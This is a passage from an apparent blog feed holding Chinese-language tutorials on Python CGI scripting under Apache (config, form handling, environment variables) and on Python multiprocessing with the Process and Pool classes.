class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 查找一下自己的DocumentRoot </span><br><span class="line">DocumentRoot  &quot;E:\Environment\phpstudy\PHPTutorial\WWW&quot;</span><br><span class="line"></span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    Order allow,deny  </span><br><span class="line">    Allow from all  </span><br><span class="line">    #Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">#让apache识别py文件为cgi程序：</span><br><span class="line">AddHandler cgi-script .cgi .py </span><br><span class="line"></span><br><span class="line">只允许在特别目录下执行cgi程序:</span><br><span class="line">ScriptAlias /cgi-bin/ &quot;D:/Program/phpStudy/Apache/cgi-bin/&quot;</span><br></pre></td></tr></table></figure></li><li><p>测试实例（python不用指定编码，测试了时候指定编码出现乱码）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()                             <span class="comment"># 空行，告诉服务器结束头部</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;html&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;head&gt;'</span>)</span><br><span class="line"><span class="comment"># print ('&lt;meta charset="UTF-8"&gt;')</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;title&gt;Hello Word 你好123！&lt;/title&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/head&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;h2&gt; Hello Word! 菜鸟123&lt;/h2&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#作为http协议的要求，一定要输出http headers</span></span><br><span class="line"><span class="comment">#在存在http headers的前提下，一定要在headers后面打印一个空行，否则服务器会报错</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529204892.39.png" alt=""></p></li></ul><h3 id="CGI-HTTP头部及CGI环境变量"><a href="#CGI-HTTP头部及CGI环境变量" class="headerlink" title="CGI HTTP头部及CGI环境变量"></a>CGI HTTP头部及CGI环境变量</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205175.71.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205233.0.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205252.14.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205271.41.png" alt=""></p><h3 id="CGI实例"><a href="#CGI实例" class="headerlink" title="CGI实例"></a>CGI实例</h3><ol><li><p>通过CGI输出CGI环境变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">"Content-type: text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;ul&gt;"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.environ.keys():</span><br><span class="line">    print(<span class="string">"&lt;li&gt;&lt;span style='color:green'&gt;%30s&lt;/span&gt; : %s&lt;/li&gt;"</span> % (i,os.environ[i]))</span><br><span class="line">print(<span class="string">"&lt;/ul&gt;"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205971.94.png" alt=""></p></li><li><p>通过CGI实现GET传递信息（也可以通过构造表单的方法实现GET信息传递，默认情况下只存放脚本文件）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建filedstorage的实例、</span></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据</span></span><br><span class="line">s_name = form.getvalue(<span class="string">'name'</span>)</span><br><span class="line">s_url = form.getvalue(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;%s博客：%s&lt;/h2&gt;"</span> % (s_name,s_url))</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529208739.64.png" alt=""></p></li><li><p>通过CGI用POST传递数据（使用上面的GET脚本结合表单来POST传递）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"get1.py"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">站点名称: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">站点 URL: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"url"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209260.07.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209306.54.png" alt=""></p></li><li><p>通过CGI程序来传递CheckBox数据（需要一个表单和CGI处理的脚本文件）</p><ul><li><p>cgi脚本文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收字段数据</span></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'google'</span>):</span><br><span class="line">    google_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    google_flag = <span class="string">"否"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'lsowl'</span>):</span><br><span class="line">    lsowl_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    lsowl_flag = <span class="string">"否"</span></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;lsowl是否选择了 : %s&lt;/h2&gt;"</span> % lsowl_flag)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;google是否选择了 : %s&lt;/h2&gt;"</span> % google_flag)</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure></li><li><p>传递数据的表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"checkbox.py"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"lsowl"</span> <span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"google"</span><span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"选择站点"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211130.67.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211139.71.png" alt=""></p></li></ul></li><li><p>通过CGI传递Radio数据（只向服务器传输一个数据）</p><ul><li><p>传递Radio数据的CGI脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'site'</span>):</span><br><span class="line">    site = form.getvalue(<span class="string">'site'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    site = <span class="string">'提交的数据为空'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;"</span> % site)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure></li><li><p>传递Radio数据的CGI表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"radion.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"lsowl"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"google"</span> /&gt;</span> Google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211658.49.png" alt=""><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211669.84.png" alt=""></p></li></ul></li><li><p>通过CGI程序传递 Textarea 数据、下拉数据等、设置cookie、上传下载文件，这些只需要改一些HTML方法就可以实现，和上面的本质上没有什么区别</p></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>本文是对python的CGI编程的一个学习，学习了CGI及python CGI编程的特性，通过CGI结合前端实现许多功能，由于后面上传下载文件这些只是修改一些方法和HTML元素，本质上差别不大，就没有写完了，可以参考链接</p><p>tp://<a href="http://www.runoob.com/python3/python3-cgi-programming.html" target="_blank" rel="noopener">www.runoob.com/python3/python3-cgi-programming.html</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python-CGI编程&quot;&gt;&lt;a href=&quot;#python-CGI编程&quot; class=&quot;headerlink&quot; title=&quot;python CGI编程&quot;&gt;&lt;/a&gt;python CGI编程&lt;/h2&gt;&lt;p&gt;###什么是CGI&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="python" scheme="https://www.lsowl.xyz/categories/python/"/>
    
    
      <category term="编程" scheme="https://www.lsowl.xyz/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="https://www.lsowl.xyz/tags/python/"/>
    
      <category term="CGI编程" scheme="https://www.lsowl.xyz/tags/CGI%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python多进程</title>
    <link href="https://www.lsowl.xyz/2018/06/16/python%E5%A4%9A%E8%BF%9B%E7%A8%8B/"/>
    <id>https://www.lsowl.xyz/2018/06/16/python多进程/</id>
    <published>2018-06-16T15:30:00.000Z</published>
    <updated>2018-06-16T15:31:28.360Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python多进程"><a href="#python多进程" class="headerlink" title="python多进程"></a>python多进程</h2><blockquote><p>python跨平台实现多进程需要使用multiprocessing这个模块，在模块中常用的两个类是process和pool</p></blockquote><h2 id="process类"><a href="#process类" class="headerlink" title="process类"></a>process类</h2><blockquote><p>process类用来描述一个进程对象。创建子进程的时候只需要传入一个执行函数和函数的参数就可以完成process实例的创建。</p></blockquote><ul><li><p>start() 方法启动进程</p></li><li><p>join()  方法实现进程之间的同步，等待所有进程退出</p></li><li><p>close()方法阻止多余的进程涌入进程池pool造成进程阻塞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> __init__(self, group=<span class="keyword">None</span>, target=<span class="keyword">None</span>, name=<span class="keyword">None</span>, args=(), kwargs=&#123;&#125;, *,mon=<span class="keyword">None</span>)</span><br><span class="line">|      初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的</span><br><span class="line">|</span><br><span class="line">|  is_alive(self)</span><br><span class="line">|      返回这个进程是否alive</span><br><span class="line">|</span><br><span class="line">|  join(self, timeout=<span class="keyword">None</span>)</span><br><span class="line">|      等待，直到子进程执行完毕</span><br><span class="line">|</span><br><span class="line">|  run(self)</span><br><span class="line">|      Method to be run <span class="keyword">in</span> sub-process; can be overridden <span class="keyword">in</span> sub-<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">start</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      开启子进程</span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">terminate</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      结束进程</span></span><br><span class="line"><span class="class">|  ----------------------------------------------------------------------</span></span><br><span class="line"><span class="class">|  <span class="title">Data</span> <span class="title">descriptors</span> <span class="title">inherited</span> <span class="title">from</span> <span class="title">multiprocessing</span>.<span class="title">process</span>.<span class="title">BaseProcess</span>:</span></span><br><span class="line">|</span><br><span class="line">|  __dict__</span><br><span class="line">|      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  __weakref__</span><br><span class="line">|      list of weak references to the object (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  authkey</span><br><span class="line">|</span><br><span class="line">|  daemon</span><br><span class="line">|      返回该进程是否为守护进程</span><br><span class="line">|</span><br><span class="line">|  exitcode</span><br><span class="line">|      返回进程的退出代码</span><br><span class="line">|</span><br><span class="line">|  ident</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br><span class="line">|</span><br><span class="line">|  name</span><br><span class="line">|</span><br><span class="line">|  pid</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br></pre></td></tr></table></figure></li><li><p>process类使用实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing,os</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Child process &#123;0&#125; &#123;1&#125; Running'</span>.format(name,os.getpid()))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'Parent process &#123;0&#125; is Running'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=run_proc,args=(str(i),))</span><br><span class="line">        print(<span class="string">'process start'</span>)</span><br><span class="line">        p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'process close'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#这里创建多个进程可以使用for循环，也可以使用进程池，在使用for循环的时候注意join方法在for循环之外</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Pool类"><a href="#Pool类" class="headerlink" title="Pool类"></a>Pool类</h2><ul><li><p>Pool类可以提供指定数量的进程供用户使用，默认是CPU核数。当有新的请求提交到Pool的时候，如果进程池没有满，则会创建一个进程执行，如果进程池满了，则会让该请求等待。</p></li><li><p>Pool对象调用join方法会等待所有的子进程执行完毕</p></li><li><p>调用join方法前必须调用close()</p></li><li><p>调用close()以后就不能继续添加新的Process</p></li><li><p>pool.apply_async() 直接启动了进程，不用使用start来启动（同步执行进程，允许多个进程同时进入进程池）</p></li><li><p>pool类使用实例（使用apply_async()来执行进程）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is Running, Parent id is &#123;2&#125;'</span>.format(name,os.getpid(),os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply_async(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156949.15.png" alt=""></p></li><li><p>pool使用实例（pool.apply(func[,args[，kwds]]) 只允许一个进程进入进程池，在一个进程结束以后，另外一个进程才可以进入执行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is running, parent id is &#123;2&#125;'</span>.format(name, os.getpid(), os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end.'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure><p><img 